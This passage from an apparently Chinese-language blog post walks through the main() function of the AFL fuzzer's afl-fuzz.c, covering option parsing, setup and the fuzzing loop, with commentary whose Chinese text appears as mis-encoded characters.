optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: &#123; <span class="comment">/* master sync ID */</span></span><br><span class="line"></span><br><span class="line">          u8* c;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">          sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((c = <span class="built_in">strchr</span>(sync_id, <span class="string">&#x27;:&#x27;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">            *c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">sscanf</span>(c + <span class="number">1</span>, <span class="string">&quot;%u/%u&quot;</span>, &amp;master_id, &amp;master_max) != <span class="number">2</span> ||</span><br><span class="line">                !master_id || !master_max || master_id &gt; master_max ||</span><br><span class="line">                master_max &gt; <span class="number">1000000</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bogus master ID passed to -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          force_deterministic = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>: </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sync_id) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -S or -M options not supported&quot;</span>);</span><br><span class="line">        sync_id = <span class="built_in">ck_strdup</span>(optarg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;f&#x27;</span>: <span class="comment">/* target file */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (out_file) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -f options not supported&quot;</span>);</span><br><span class="line">        out_file = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>: <span class="comment">/* dictionary */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (extras_dir) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -x options not supported&quot;</span>);</span><br><span class="line">        extras_dir = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>: &#123; <span class="comment">/* timeout */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (timeout_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -t options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u%c&quot;</span>, &amp;exec_tmout, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (exec_tmout &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -t&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (suffix == <span class="string">&#x27;+&#x27;</span>) timeout_given = <span class="number">2</span>; <span class="keyword">else</span> timeout_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>: &#123; <span class="comment">/* mem limit */</span></span><br><span class="line"></span><br><span class="line">          u8 suffix = <span class="string">&#x27;M&#x27;</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -m options not supported&quot;</span>);</span><br><span class="line">          mem_limit_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(optarg, <span class="string">&quot;none&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            mem_limit = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%llu%c&quot;</span>, &amp;mem_limit, &amp;suffix) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">switch</span> (suffix) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: mem_limit *= <span class="number">1024</span> * <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>: mem_limit *= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>: mem_limit /= <span class="number">1024</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:  <span class="built_in">FATAL</span>(<span class="string">&quot;Unsupported suffix or bad syntax for -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (mem_limit &lt; <span class="number">5</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Dangerously low value of -m&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sizeof</span>(<span class="type">rlim_t</span>) == <span class="number">4</span> &amp;&amp; mem_limit &gt; <span class="number">2000</span>)</span><br><span class="line">            <span class="built_in">FATAL</span>(<span class="string">&quot;Value of -m out of range on 32-bit systems&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>: &#123; <span class="comment">/* bind CPU core */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (cpu_to_bind_given) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -b options not supported&quot;</span>);</span><br><span class="line">          cpu_to_bind_given = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (<span class="built_in">sscanf</span>(optarg, <span class="string">&quot;%u&quot;</span>, &amp;cpu_to_bind) &lt; <span class="number">1</span> ||</span><br><span class="line">              optarg[<span class="number">0</span>] == <span class="string">&#x27;-&#x27;</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Bad syntax used for -b&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>: <span class="comment">/* skip deterministic */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (skip_deterministic) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -d options not supported&quot;</span>);</span><br><span class="line">        skip_deterministic = <span class="number">1</span>;</span><br><span class="line">        use_splicing = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: <span class="comment">/* load bitmap */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This is a secret undocumented option! It is useful if you find</span></span><br><span class="line"><span class="comment">           an interesting test case during a normal fuzzing process, and want</span></span><br><span class="line"><span class="comment">           to mutate it without rediscovering any of the test cases already</span></span><br><span class="line"><span class="comment">           found during an earlier run.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           To use this mode, you need to point -B to the fuzz_bitmap produced</span></span><br><span class="line"><span class="comment">           by an earlier run for the exact same binary... and that&#x27;s it.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           I only used this once or twice to get variants of a particular</span></span><br><span class="line"><span class="comment">           file, so I&#x27;m not making this an official setting. */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_bitmap) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -B options not supported&quot;</span>);</span><br><span class="line"></span><br><span class="line">        in_bitmap = optarg;</span><br><span class="line">        <span class="built_in">read_bitmap</span>(in_bitmap);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: <span class="comment">/* crash mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -C options not supported&quot;</span>);</span><br><span class="line">        crash_mode = FAULT_CRASH;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: <span class="comment">/* dumb mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dumb_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -n options not supported&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DUMB_FORKSRV&quot;</span>)) dumb_mode = <span class="number">2</span>; <span class="keyword">else</span> dumb_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;T&#x27;</span>: <span class="comment">/* banner */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_banner) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -T options not supported&quot;</span>);</span><br><span class="line">        use_banner = optarg;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;Q&#x27;</span>: <span class="comment">/* QEMU mode */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (qemu_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;Multiple -Q options not supported&quot;</span>);</span><br><span class="line">        qemu_mode = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mem_limit_given) mem_limit = MEM_LIMIT_QEMU;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;V&#x27;</span>: <span class="comment">/* Show version number */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Version number has been printed already, just quit. */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (optind == argc || !in_dir || !out_dir) <span class="built_in">usage</span>(argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setup_signal_handlers</span>();</span><br><span class="line">  <span class="built_in">check_asan_opts</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sync_id) <span class="built_in">fix_up_sync</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, out_dir))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;-C and -n are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (qemu_mode)  <span class="built_in">FATAL</span>(<span class="string">&quot;-Q and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_FORKSRV&quot;</span>))    no_forkserver    = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_CPU_RED&quot;</span>))    no_cpu_meter_red = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_ARITH&quot;</span>))      no_arith         = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_SHUFFLE_QUEUE&quot;</span>)) shuffle_queue    = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_FAST_CAL&quot;</span>))      fast_cal         = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>)) &#123;</span><br><span class="line">    hang_tmout = <span class="built_in">atoi</span>(<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!hang_tmout) <span class="built_in">FATAL</span>(<span class="string">&quot;Invalid value of AFL_HANG_TMOUT&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode == <span class="number">2</span> &amp;&amp; no_forkserver)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_DUMB_FORKSRV and AFL_NO_FORKSRV are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;DYLD_INSERT_LIBRARIES&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_LD_PRELOAD&quot;</span>))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Use AFL_PRELOAD instead of AFL_LD_PRELOAD&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">save_cmdline</span>(argc, argv);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fix_up_banner</span>(argv[optind]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_if_tty</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">get_core_count</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">  <span class="built_in">bind_to_free_cpu</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* HAVE_AFFINITY */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_crash_handling</span>();</span><br><span class="line">  <span class="built_in">check_cpu_governor</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setup_post</span>();</span><br><span class="line">  <span class="built_in">setup_shm</span>();</span><br><span class="line">  <span class="built_in">init_count_class16</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setup_dirs_fds</span>();</span><br><span class="line">  <span class="built_in">read_testcases</span>();</span><br><span class="line">  <span class="built_in">load_auto</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pivot_inputs</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (extras_dir) <span class="built_in">load_extras</span>(extras_dir);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!timeout_given) <span class="built_in">find_timeout</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">detect_file_args</span>(argv + optind + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!out_file) <span class="built_in">setup_stdio_file</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">check_binary</span>(argv[optind]);</span><br><span class="line"></span><br><span class="line">  start_time = <span class="built_in">get_cur_time</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (qemu_mode)</span><br><span class="line">    use_argv = <span class="built_in">get_qemu_argv</span>(argv[<span class="number">0</span>], argv + optind, argc - optind);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    use_argv = argv + optind;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">perform_dry_run</span>(use_argv);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">cull_queue</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">show_init_stats</span>();</span><br><span class="line"></span><br><span class="line">  seek_to = <span class="built_in">find_start_position</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">save_auto</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Woop woop woop */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!not_on_tty) &#123;</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">4</span>);</span><br><span class="line">    start_time += <span class="number">4000</span>;</span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">goto</span> stop_fuzzing;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    u8 skipped_fuzz;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cull_queue</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!queue_cur) &#123;</span><br><span class="line"></span><br><span class="line">      queue_cycle++;</span><br><span class="line">      current_entry     = <span class="number">0</span>;</span><br><span class="line">      cur_skipped_paths = <span class="number">0</span>;</span><br><span class="line">      queue_cur         = queue;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> (seek_to) &#123;</span><br><span class="line">        current_entry++;</span><br><span class="line">        seek_to--;</span><br><span class="line">        queue_cur = queue_cur-&gt;next;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (not_on_tty) &#123;</span><br><span class="line">        <span class="built_in">ACTF</span>(<span class="string">&quot;Entering queue cycle %llu.&quot;</span>, queue_cycle);</span><br><span class="line">        <span class="built_in">fflush</span>(stdout);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we had a full queue cycle with no new finds, try</span></span><br><span class="line"><span class="comment">         recombination strategies next. */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (queued_paths == prev_queued) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (use_splicing) cycles_wo_finds++; <span class="keyword">else</span> use_splicing = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">else</span> cycles_wo_finds = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      prev_queued = queued_paths;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (sync_id &amp;&amp; queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">getenv</span>(<span class="string">&quot;AFL_IMPORT_FIRST&quot;</span>))</span><br><span class="line">        <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    skipped_fuzz = <span class="built_in">fuzz_one</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; sync_id &amp;&amp; !skipped_fuzz) &#123;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (!(sync_interval_cnt++ % SYNC_INTERVAL))</span><br><span class="line">        <span class="built_in">sync_fuzzers</span>(use_argv);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!stop_soon &amp;&amp; exit_1) stop_soon = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (stop_soon) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    queue_cur = queue_cur-&gt;next;</span><br><span class="line">    current_entry++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cur) <span class="built_in">show_stats</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we stopped programmatically, we kill the forkserver and the current runner. </span></span><br><span class="line"><span class="comment">     If we stopped manually, this is done by the signal handler. */</span></span><br><span class="line">  <span class="keyword">if</span> (stop_soon == <span class="number">2</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (child_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(child_pid, SIGKILL);</span><br><span class="line">      <span class="keyword">if</span> (forksrv_pid &gt; <span class="number">0</span>) <span class="built_in">kill</span>(forksrv_pid, SIGKILL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* Now that we&#x27;ve killed the forkserver, we wait for it to be able to get rusage stats. */</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">waitpid</span>(forksrv_pid, <span class="literal">NULL</span>, <span class="number">0</span>) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">WARNF</span>(<span class="string">&quot;error waitpid\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write_bitmap</span>();</span><br><span class="line">  <span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">save_auto</span>();</span><br><span class="line"></span><br><span class="line">stop_fuzzing:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(CURSOR_SHOW cLRD <span class="string">&quot;\n\n+++ Testing aborted %s +++\n&quot;</span> cRST,</span><br><span class="line">       stop_soon == <span class="number">2</span> ? <span class="string">&quot;programmatically&quot;</span> : <span class="string">&quot;by user&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Running for more than 30 minutes but still doing first cycle? */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (queue_cycle == <span class="number">1</span> &amp;&amp; <span class="built_in">get_cur_time</span>() - start_time &gt; <span class="number">30</span> * <span class="number">60</span> * <span class="number">1000</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cYEL <span class="string">&quot;[!] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;Stopped during the first cycle, results may be incomplete.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    (For info on resuming, see %s/README.)\n&quot;</span>, doc_path);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fclose</span>(plot_file);</span><br><span class="line">  <span class="built_in">destroy_queue</span>();</span><br><span class="line">  <span class="built_in">destroy_extras</span>();</span><br><span class="line">  <span class="built_in">ck_free</span>(target_path);</span><br><span class="line">  <span class="built_in">ck_free</span>(sync_id);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">alloc_report</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">OKF</span>(<span class="string">&quot;We&#x27;re done here. Have a nice day!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !AFL_LIB *</span></span></span><br><span class="line"><span class="comment"><span class="meta"></span></span></span><br></pre></td></tr></table></figure><p>å› ä¸ºæ˜¯æ•´ä¸ªAFLçš„æ ¸å¿ƒåŒºåŸŸï¼Œå‡½æ•°é•¿åº¦æœ‰ç‚¹é•¿ï¼Œæˆ‘ä»¬ä»ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†åˆ†æ</p><h3 id="ä¸»è¦æ•°æ®ç»“æ„ã€å˜é‡å’Œåˆå§‹åŒ–"><a href="#ä¸»è¦æ•°æ®ç»“æ„ã€å˜é‡å’Œåˆå§‹åŒ–" class="headerlink" title="ä¸»è¦æ•°æ®ç»“æ„ã€å˜é‡å’Œåˆå§‹åŒ–"></a>ä¸»è¦æ•°æ®ç»“æ„ã€å˜é‡å’Œåˆå§‹åŒ–</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s32 opt;                        <span class="comment">// getopté€‰é¡¹è§£æ</span></span><br><span class="line">u64 prev_queued = <span class="number">0</span>;           <span class="comment">// ä¸Šä¸€è½®é˜Ÿåˆ—ä¸­çš„æµ‹è¯•ç”¨ä¾‹æ•°</span></span><br><span class="line">u32 sync_interval_cnt = <span class="number">0</span>,      <span class="comment">// åŒæ­¥é—´éš”è®¡æ•°å™¨</span></span><br><span class="line">    seek_to;                   <span class="comment">// é˜Ÿåˆ—ä¸­çš„èµ·å§‹ä½ç½®</span></span><br><span class="line">u8  *extras_dir = <span class="number">0</span>;           <span class="comment">// é¢å¤–å­—å…¸ç›®å½•</span></span><br><span class="line">u8  mem_limit_given = <span class="number">0</span>;       <span class="comment">// å†…å­˜é™åˆ¶æ˜¯å¦è®¾ç½®</span></span><br><span class="line">u8  exit_1 = !!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_BENCH_JUST_ONE&quot;</span>); <span class="comment">// åŸºå‡†æµ‹è¯•æ¨¡å¼</span></span><br><span class="line"><span class="type">char</span>** use_argv;               <span class="comment">// å®é™…ä½¿ç”¨çš„å‘½ä»¤è¡Œå‚æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">timeval</span> tv;             <span class="comment">// æ—¶é—´ç»“æ„</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">timezone</span> tz;            <span class="comment">// æ—¶åŒºç»“æ„</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯</span></span><br><span class="line"><span class="built_in">SAYF</span>(cCYA <span class="string">&quot;afl-fuzz &quot;</span> cBRI VERSION cRST <span class="string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. è®¾ç½®æ–‡æ¡£è·¯å¾„</span></span><br><span class="line">doc_path = <span class="built_in">access</span>(DOC_PATH, F_OK) ? <span class="string">&quot;docs&quot;</span> : DOC_PATH;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨</span></span><br><span class="line"><span class="built_in">gettimeofday</span>(&amp;tv, &amp;tz);</span><br><span class="line"><span class="built_in">srandom</span>(tv.tv_sec ^ tv.tv_usec ^ <span class="built_in">getpid</span>());</span><br></pre></td></tr></table></figure><p>è·Ÿafl-asä½¿ç”¨ç›¸åŒçš„ç­–ç•¥ï¼Œç¡®ä¿æ•´ä¸ªAFLå·¥å…·çš„éšæœºæ€§ä¸€è‡´</p><h3 id="å‘½ä»¤è¡Œè§£æ"><a href="#å‘½ä»¤è¡Œè§£æ" class="headerlink" title="å‘½ä»¤è¡Œè§£æ"></a>å‘½ä»¤è¡Œè§£æ</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((opt = <span class="built_in">getopt</span>(argc, argv, <span class="string">&quot;+i:o:f:m:b:t:T:dnCB:S:M:x:QV&quot;</span>)) &gt; <span 